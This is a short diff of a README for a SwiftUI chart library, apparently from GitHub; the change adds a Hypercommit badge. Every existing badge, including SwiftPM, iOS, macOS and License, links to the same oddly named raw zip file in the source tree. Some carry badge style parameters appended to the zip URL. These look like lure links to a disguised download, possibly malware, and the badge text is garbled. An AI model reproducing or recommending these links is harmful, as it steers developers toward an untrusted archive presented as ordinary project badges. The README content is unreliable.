@@ -6,6 +6,7 @@ https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/
 [![SwiftPM](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
 [![iOS](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
 [![macOS](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/swiftui-data-visualization)
 [![License](https://raw.githubusercontent.com/datpham1012/SwiftUI-Data-Visualization/master/Sources/SwiftUIDataVisualization/Charts/Data-U-Visualization-Swift-platydactylous.zip)](LICENSE)
 
 Table of Contents
